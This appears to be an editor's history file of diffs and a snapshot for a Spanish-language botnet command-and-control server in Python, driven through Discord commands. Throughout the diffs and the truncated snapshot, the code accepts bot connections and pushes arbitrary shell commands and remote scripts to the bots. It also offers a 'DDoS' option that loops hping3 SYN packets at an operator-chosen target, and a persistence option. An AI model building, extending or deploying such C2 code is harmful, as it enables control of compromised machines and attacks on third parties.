respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots(bot_id):\r\n-    \"\"\"\r\n-    Cierra la conexión con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n-    los bots conectados.\r\n-    \r\n-    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n-    :type bot_id: int\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot:  # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close()  # Cerrar la conexión\r\n-            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot)  # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot]  # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot]  # Eliminar el SO del bot\n-import discord\r\n-from discord.ext import commands\r\n-import logging\r\n-import configparser\r\n-import os\r\n-\r\n-# Cargar configuración\r\n-config = configparser.ConfigParser()\r\n-config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n-\r\n-intents = discord.Intents.default()\r\n-intents.message_content = True\r\n-bot = commands.Bot(command_prefix='!', intents=intents)\r\n-\r\n-@bot.event\r\n-async def on_ready():\r\n-    logging.info(f'Bot conectado como {bot.user}')\r\n-    print(f'Bot conectado como {bot.user}')\r\n-\r\n-@bot.command(name='listar_bots')\r\n-async def listar_bots_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para listar los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            response = \"\\nBots conectados:\\n\"\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n-        else:\r\n-            response = \"No hay bots conectados.\"\r\n-        await ctx.send(response)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-        await ctx.send(\"Error al listar bots.\")\r\n-\r\n-@bot.command(name='enviar_comando')\r\n-async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n-    \"\"\"\r\n-    Comando de Discord para enviar un comando a los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        enviar_comando(comando_windows, comando_linux)\r\n-        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-        await ctx.send(\"Error al enviar comando.\")\r\n-\r\n-@bot.command(name='cerrar_conexion')\r\n-async def cerrar_conexion_command(ctx, bot_id: int):\r\n-    \"\"\"\r\n-    Comando de Discord para cerrar la conexión con un bot específico.\r\n-    \"\"\"\r\n-    try:\r\n-        cerrar_conexion_bots(bot_id)\r\n-        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n-\r\n-@bot.command(name='menu_comandos')\r\n-async def menu_comandos_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar el menú de comandos.\r\n-    \"\"\"\r\n-    try:\r\n-        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n-        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-        tipo_comando = tipo_comando.content.strip()\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n-                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                objetivo = objetivo.content.strip()\r\n-                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n-                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                puerto = puerto.content.strip()\r\n-                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n-                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                protocolo = protocolo.content.strip().upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    await ctx.send(\"Protocolo no válido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n-                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_windows = comando_windows.content.strip()\r\n-                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n-                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_linux = comando_linux.content.strip()\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n-                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                tipo = tipo.content.strip()\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n-                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    extension = extension.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n-                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_linux = interprete_linux.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n-                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_windows = interprete_windows.content.strip()\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n-                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                metodo = metodo.content.strip()\r\n-\r\n-                if metodo == \"1\":\r\n-                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                        linea = linea.content.strip()\r\n-                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n-                            break\r\n-                        lineas.append(linea)\r\n-                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n-                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    ruta = ruta.content.strip()\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-        else:\r\n-            await ctx.send(\"Opción no válida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el menú de comandos: {e}\")\r\n-        await ctx.send(\"Error en el menú de comandos.\")\r\n-\r\n-@bot.command(name='ayuda')\r\n-async def ayuda_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar la ayuda del bot.\r\n-    \"\"\"\r\n-    help_text = \"\"\"\r\n-    **Comandos disponibles:**\r\n-\r\n-    **!listar_bots**\r\n-    - Lista los bots conectados al servidor.\r\n-\r\n-    **!enviar_comando <comando_windows> <comando_linux>**\r\n-    - Envía un comando a los bots conectados.\r\n-    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n-\r\n-    **!cerrar_conexion <bot_id>**\r\n-    - Cierra la conexión con un bot específico\n\\ No newline at end of file\n+bot.run(config.get(\"DISCORD\", \"BOT_TOKEN\"))\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740255889937,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -3,8 +3,11 @@\n import logging\r\n import configparser\r\n import os\r\n import requests\r\n+import threading\r\n+import socket\r\n+import time\r\n \r\n # Cargar configuración\r\n config = configparser.ConfigParser()\r\n config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n@@ -14,8 +17,12 @@\n bot = commands.Bot(command_prefix='!', intents=intents)\r\n \r\n # Variables globales\r\n API_URL = \"http://127.0.0.1:5000\"  # URL de la API del servidor\r\n+bots = []  # Lista de bots conectados\r\n+bot_ids = {}  # Diccionario con los IDs de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n \r\n # Configurar logging\r\n logging.basicConfig(\r\n     level=logging.INFO,\r\n@@ -291,5 +298,117 @@\n             print(\"Error al enviar comando.\")\r\n     except Exception as e:\r\n         logging.error(f\"Error al enviar comando: {e}\")\r\n \r\n-bot.run(config.get(\"DISCORD\", \"BOT_TOKEN\"))\n\\ No newline at end of file\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"\r\n+    Maneja una conexión de bot y la agrega a la lista de bots.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n+\r\n+        # Detectar sistema operativo\r\n+        try:\r\n+            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+            sistemas_operativos[conn] = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+            print(f\"Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}\")\r\n+        except Exception as e:\r\n+            print(f\"Error al detectar OS de {addr}: {e}\")\r\n+            sistemas_operativos[conn] = \"desconocido\"\r\n+\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    continue\r\n+\r\n+                # Guardar la respuesta en el diccionario sin imprimirla\r\n+                respuestas_bots[bot_id] = data\r\n+\r\n+            except socket.timeout:\r\n+                print(f\"Tiempo de espera agotado con {addr}.\")\r\n+            except Exception as e:\r\n+                print(f\"Error con {addr}: {e}\")\r\n+                break\r\n+\r\n+        # Manejo de desconexión\r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n+    finally:\r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"\r\n+    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Aceptando conexiones de bots\")\r\n+        bot_id = 1  # Contador de bots\r\n+        while True:\r\n+            try:\r\n+                conn, addr = server.accept()  # Aceptar la conexión\r\n+                bots.append(conn)  # Agregar el bot a la lista\r\n+                bot_ids[conn] = bot_id  # Asignar el ID del bot\r\n+                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()  # Crear un hilo para manejar la conexión\r\n+                bot_id += 1  # Incrementar el contador de bots\r\n+            except OSError:\r\n+                break\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n+\r\n+def iniciar_servidor(HOST, PORT):\r\n+    \"\"\"\r\n+    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n+    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n+    para aceptar conexiones y entra en un bucle para mostrar un menú principal\r\n+    que permite al usuario interactuar con los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crear el socket\r\n+        server.bind((HOST, PORT))  # Asociar el socket a la IP y el puerto\r\n+        server.listen(5)  # Escuchar conexiones\r\n+        print(f\"Escuchando en {HOST}:{PORT}...\")  # Imprimir que el servidor está escuchando\r\n+        \r\n+        threading.Thread(target=aceptar_conexiones, args=(server,)).start()  # Crear un hilo para aceptar conexiones\r\n+\r\n+        while True:\r\n+            time.sleep(1)\r\n+        \r\n+        # Esperar a que todos los hilos de bots terminen\r\n+        for bot in bots:\r\n+            bot.close()\r\n+        for thread in threading.enumerate():\r\n+            if thread is not threading.current_thread():\r\n+                thread.join()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el servidor CnC: {e}\")\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        config = configparser.ConfigParser()\r\n+        config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+        HOST = config.get(\"NETWORK\", \"HOST\")\r\n+        PORT = config.getint(\"NETWORK\", \"PORT\")\r\n+        threading.Thread(target=iniciar_servidor, args=(HOST, PORT)).start()\r\n+        bot.run(config.get(\"DISCORD\", \"BOT_TOKEN\"))\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en la ejecución principal: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740256033989,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -302,10 +302,10 @@\n                 comando_windows = comando_windows.content.strip()\r\n                 await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n                 comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                 comando_linux = comando_linux.content.strip()\r\n-    try:\r\n-        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n         print(f\"Bot {bot_id} conectado desde {addr}\")\r\n \r\n         # Detectar sistema operativo\r\n         try:\r\n"
                },
                {
                    "date": 1740256134530,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -302,9 +302,144 @@\n                 comando_windows = comando_windows.content.strip()\r\n                 await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n                 comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n                 comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico.\r\n+    - Ejemplo: `!cerrar_conexion 1`\r\n+\r\n+    **!menu_comandos**\r\n+    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n+\r\n+    **!ayuda**\r\n+    - Muestra este mensaje de ayuda.\r\n+    \"\"\"\r\n+    await ctx.send(help_text)\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n     try:\r\n+        data = {\r\n+            \"comando_windows\": comando_windows,\r\n+            \"comando_linux\": comando_linux,\r\n+            \"tipo_comando\": tipo_comando,\r\n+            \"seleccion\": \"1\"  # Enviar a todos los bots\r\n+        }\r\n+        response = requests.post(f\"{API_URL}/enviar_comando\", json=data)\r\n+        if response.status_code == 200:\r\n+            print(\"Comando enviado a los bots seleccionados.\")\r\n+        else:\r\n+            print(\"Error al enviar comando.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"\r\n+    Maneja una conexión de bot y la agrega a la lista de bots.\r\n+    \"\"\"\r\n+    try:\r\n         logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n         print(f\"Bot {bot_id} conectado desde {addr}\")\r\n \r\n         # Detectar sistema operativo\r\n"
                }
            ],
            "date": 1740253469721,
            "name": "Commit-0",
            "content": "import discord\r\nfrom discord.ext import commands\r\nimport logging\r\nimport configparser\r\nimport os\r\n\r\n# Cargar configuración\r\nconfig = configparser.ConfigParser()\r\nconfig.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    logging.info(f'Bot conectado como {bot.user}')\r\n    print(f'Bot conectado como {bot.user}')\r\n\r\n@bot.command(name='listar_bots')\r\nasync def listar_bots_command(ctx):\r\n    \"\"\"\r\n    Comando de Discord para listar los bots conectados.\r\n    \"\"\"\r\n    try:\r\n        if bots:\r\n            response = \"\\nBots conectados:\\n\"\r\n            for bot_conn in bots:\r\n                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n        else:\r\n            response = \"No hay bots conectados.\"\r\n        await ctx.send(response)\r\n    except Exception as e:\r\n        logging.error(f\"Error al listar bots: {e}\")\r\n        await ctx.send(\"Error al listar bots.\")\r\n\r\n@bot.command(name='enviar_comando')\r\nasync def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n    \"\"\"\r\n    Comando de Discord para enviar un comando a los bots conectados.\r\n    \"\"\"\r\n    try:\r\n        enviar_comando(comando_windows, comando_linux)\r\n        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al enviar comando: {e}\")\r\n        await ctx.send(\"Error al enviar comando.\")\r\n\r\n@bot.command(name='cerrar_conexion')\r\nasync def cerrar_conexion_command(ctx, bot_id: int):\r\n    \"\"\"\r\n    Comando de Discord para cerrar la conexión con un bot específico.\r\n    \"\"\"\r\n    try:\r\n        cerrar_conexion_bots(bot_id)\r\n        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n    except Exception as e:\r\n        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n\r\n@bot.command(name='menu_comandos')\r\nasync def menu_comandos_command(ctx):\r\n    \"\"\"\r\n    Comando de Discord para mostrar el menú de comandos.\r\n    \"\"\"\r\n    try:\r\n        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n        tipo_comando = tipo_comando.content.strip()\r\n\r\n        if tipo_comando == \"1\":\r\n            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n            orden = orden.content.strip()\r\n            comando_windows = \"\"\r\n            comando_linux = \"\"\r\n\r\n            if orden == \"1\":\r\n                comando_windows = \"systeminfo\"\r\n                comando_linux = \"uname -a && lsb_release -a\"\r\n            elif orden == \"2\":\r\n                comando_windows = \"netstat -ano\"\r\n                comando_linux = \"netstat -tunapl\"\r\n            elif orden == \"3\":\r\n                comando_windows = \"tasklist\"\r\n                comando_linux = \"ps aux\"\r\n            elif orden == \"4\":\r\n                comando_windows = \"dir\"\r\n                comando_linux = \"ls -lah\"\r\n            elif orden == \"5\":\r\n                comando_windows = \"curl ifconfig.me\"\r\n                comando_linux = \"curl ifconfig.me\"\r\n            else:\r\n                await ctx.send(\"Opción no válida.\")\r\n                return\r\n\r\n            enviar_comando(comando_windows, comando_linux)\r\n\r\n        elif tipo_comando == \"2\":\r\n            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n            orden = orden.content.strip()\r\n            comando_windows = \"\"\r\n            comando_linux = \"\"\r\n\r\n            if orden == \"1\":\r\n                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n                objetivo = await bot.wait_for('message', check=lambda 